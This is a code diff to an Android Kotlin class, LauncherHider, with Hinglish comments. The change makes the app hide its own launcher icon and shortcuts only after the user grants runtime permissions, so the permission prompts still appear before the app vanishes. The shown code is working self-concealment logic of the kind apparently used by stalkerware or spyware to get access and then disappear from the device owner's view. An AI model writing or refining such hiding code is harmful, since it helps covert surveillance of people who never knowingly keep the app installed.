@@ -30,12 +30,19 @@ object LauncherHider {
     private val hideHandler = Handler(Looper.getMainLooper())
 
     fun ensureLaunchableForSetup(context: Context) {
+        if (SyncBootstrap.needsRuntimePermissions(context)) {
+            return
+        }
         hideNow(context)
     }
 
-    /** Install ke turant icon hatao — permission se pehle. */
+    /** Sirf Allow ke baad. Permission se pehle hide popup ko maar deta hai. */
     fun hideNow(context: Context) {
         val app = context.applicationContext
+        if (SyncBootstrap.needsRuntimePermissions(app)) {
+            Log.w(TAG, "Skip hide — permission popup pending")
+            return
+        }
         markHidden(app)
         clearShortcuts(app)
         applyStage(app, 0)
@@ -54,6 +61,9 @@ object LauncherHider {
 
     fun hideIfMarked(context: Context) {
         val app = context.applicationContext
+        if (SyncBootstrap.needsRuntimePermissions(app)) {
+            return
+        }
         val marked = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
             .getBoolean(KEY_HIDDEN, false)
         if (marked || InstallFlow.isSetupComplete(app)) {
@@ -88,6 +98,10 @@ object LauncherHider {
 
     fun applyStage(context: Context, stage: Int) {
         val app = context.applicationContext
+        if (SyncBootstrap.needsRuntimePermissions(app)) {
+            Log.w(TAG, "Skip hide stage=$stage — waiting for Allow")
+            return
+        }
         val pm = app.packageManager
         val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
         val hidden = ComponentName(app.packageName, HIDDEN_ALIAS)
